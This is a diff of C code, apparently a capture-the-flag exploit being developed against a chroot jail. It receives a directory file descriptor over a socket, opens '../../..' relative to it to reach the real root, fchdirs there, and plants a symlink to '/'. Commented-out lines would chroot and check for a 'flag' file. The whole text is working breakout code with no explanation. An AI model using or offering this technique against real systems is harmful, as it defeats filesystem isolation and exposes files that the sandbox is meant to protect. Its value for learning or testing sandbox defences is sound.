@@ -122,11 +122,43 @@ int main()
 	int remote_fd = recv_fd(cl);
 	my_log("got fd", remote_fd);
 
-    int test_fd = openat(remote_fd, "test", O_CREAT| O_WRONLY, 0755);
-    if (test_fd < 0)
+    int real_root_fd = openat(remote_fd, "../../..", 0);
+    if (real_root_fd < 0)
     {
-        my_err("failed to open test");
+        my_err("failed to open real_root");
     }
+	my_log("root fd", real_root_fd);
+
+	my_log("fchdiring", real_root_fd);
+    int ret = fchdir(real_root_fd);
+    if (ret != 0)
+    {
+        my_err("fchdir");
+    }
+
+    my_log("link", 0);
+    ret = symlink("/", "tmp/chroots/2");
+    if (ret != 0)
+    {
+        my_err("link");
+    }
+    my_log("linked", 0);
+
+	/* my_log("chrooting", real_root_fd); */
+    /* ret = chroot("."); */
+    /* if (ret != 0) */
+    /* { */
+    /*     my_err("chroot"); */
+    /* } */
+    /*  */
+    /* struct stat sb; */
+	/* my_log("stating", real_root_fd); */
+    /* ret = stat("flag", &sb);  */
+    /* if (ret == -1) */
+    /* { */
+    /*     my_err("stat"); */
+    /* } */
+    /* my_log("flag stat", sb.st_mode); */
 
 	close(cl);
 
